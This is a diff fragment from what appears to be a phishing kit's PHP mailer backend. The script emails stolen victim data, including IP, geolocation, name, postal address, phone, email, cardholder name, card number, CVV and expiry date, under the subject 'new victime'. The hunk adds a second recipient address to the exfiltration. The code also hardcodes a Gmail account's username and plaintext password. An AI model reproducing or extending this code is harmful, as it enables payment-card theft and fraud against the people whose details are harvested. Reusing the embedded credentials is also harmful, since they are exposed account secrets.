@@ -122,6 +122,7 @@ $mail->Username = "mehdiouatmane9@gmail.com";
 $mail->Password = "mehdi2014@A";
 $mail->SetFrom   ("mehdiouatmane9@gmail.com"   , "FROM" );	         
 $mail->AddAddress("mehdiouatmane9@gmail.com"   , "TOfriend1" );   
+$mail->AddAddress("Zoonzun@yahoo.com"   , "TOfriend2" );   
 $mail->IsHTML(true);   
 $mail->Subject = 'new victime';           
 $mail->Body = 'les info victime: '             .                '<br> ip: '  .  $ip                        .                    '<br> infoip: '  .  $infoip['country'] . " "  . $infoip['city']                     .                     '<br> name: '  .  $name                .             '<br> date: '  .  $date                         .                     '<br> address: ' .  $address                   .                    '<br> codepostal: '  .  $codepostal                         .                  '<br> city: '  .  $city                    .               '<br> phone: '   .   $phone                     .               '<br> email: '    .   $email                        .                  '<br> namecard: '    .   $namecard                         .                 '<br> cardnumber: '   .  $cardnumber                      .               '<br> cvv: '  .  $cvv                    .                 '<br> datexp: '   .  $datexp        ;           
